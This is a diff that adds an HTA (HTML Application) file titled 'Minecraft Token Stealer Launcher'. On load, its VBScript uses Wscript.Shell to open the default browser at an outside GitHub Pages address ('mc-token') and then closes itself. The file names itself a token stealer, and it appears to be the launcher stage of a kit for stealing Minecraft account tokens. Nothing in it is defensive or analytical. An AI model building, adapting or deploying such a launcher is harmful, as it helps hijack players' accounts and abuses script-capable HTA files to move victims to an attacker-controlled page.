@@ -1,0 +1,30 @@
+<HTML>
+<HEAD>
+<TITLE>Minecraft Token Stealer Launcher</TITLE>
+</HEAD>
+<BODY STYLE="background-color:#1a1a1a; color:white; font-family:Arial;">
+    <div style="text-align:center; padding-top:50px;">
+        <h2>Launching Minecraft Token Stealer...</h2>
+        <p>Please wait for the browser window to open.</p>
+        <p><b>Note:</b> If you see a blank page, ensure your internet connection is active.</p>
+    </div>
+
+    <SCRIPT LANGUAGE="VBScript">
+        Sub Window_OnLoad
+            ' This VBScript launches the default browser and navigates to your GitHub Page
+            Dim shell
+            Set shell = CreateObject("Wscript.Shell")
+            
+            ' REPLACE THIS URL WITH YOUR GITHUB PAGES URL
+            Dim githubUrl
+            githubUrl = "https://mreamistic.github.io/mc-token/"
+            
+            ' Open the URL in default browser
+            shell.Run """" & githubUrl & """", 1, False
+            
+            ' Close this hta window after a short delay
+            Window.Close
+        End Sub
+    </SCRIPT>
+</BODY>
+</HTML>
